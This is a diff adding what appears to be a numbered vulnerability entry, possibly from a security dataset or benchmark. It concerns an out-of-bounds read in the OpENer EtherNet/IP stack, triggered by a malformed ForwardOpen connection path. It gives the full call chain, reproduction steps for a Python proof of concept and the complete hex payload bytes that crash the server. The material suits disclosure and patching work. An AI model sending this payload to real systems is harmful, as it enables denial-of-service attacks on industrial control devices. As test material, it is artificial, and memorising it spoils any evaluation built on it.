@@ -1,0 +1,11 @@
+Number: 570
+
+Summarize:
+A malformed `ForwardOpen` request can trigger a network-reachable out-of-bounds read in OpENer during connection-path parsing. In `ParseConnectionPath()`, the trailing Simple Data Segment length byte is trusted without checking that it still fits the remaining path budget, so `remaining_path` can underflow and `message` can be advanced past the request buffer. The next `GetPathSegmentType(message)` access then reads out of bounds and crashes the server. The reachable path shown is `HandleDataOnTcpSocket()` -> `HandleReceivedExplictTcpData()` -> `HandleReceivedSendRequestResponseDataCommand()` -> `NotifyCommonPacketFormat()` -> `NotifyMessageRouter()` -> `NotifyClass()` -> `ForwardOpen()` -> `ForwardOpenRoutine()` -> `HandleNonNullNonMatchingForwardOpenRequest()` -> `ParseConnectionPath()` -> `GetPathSegmentType()`. `HandleNonNullNonMatchingForwardOpenRequest()` calls `ParseConnectionPath()` before any `open_connection_function` is called.
+
+Reproduce:
+Run the provided Python 3 PoC against an OpENer server listening on `127.0.0.1:44818`. The script registers a session, wraps a CIP `ForwardOpen` request to Connection Manager class `0x06`, instance `1`, inside `SendRRData`, and sends it over TCP 44818. It supports `baseline` and `crash`; `baseline` uses the valid path `20 04 24 97 2C 96 2C 64`, while `crash` appends `80 FF` so the trailing Simple Data Segment claims `0xff` words with only one word left. Command: `python3 poc.py crash`. On the vulnerable server, `ParseConnectionPath()` underflows `remaining_path`, advances past the request buffer, and `GetPathSegmentType()` dereferences out of bounds and crashes the server.
+
+Payload:
+65 00 04 00 00 00 00 00 00 00 00 00 52 45 47 53 45 53 53 4e 00 00 00 00 01 00 00 00
+6f 00 44 00 01 00 00 00 00 00 00 00 46 57 44 42 41 44 21 21 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 b2 00 34 00 54 02 20 06 24 01 0a 0e 11 11 11 11 22 22 22 22 34 12 21 43 be ba fe ca 01 00 00 00 a0 86 01 00 26 40 a0 86 01 00 22 40 01 05 20 04 24 97 2c 96 2c 64 80 ff
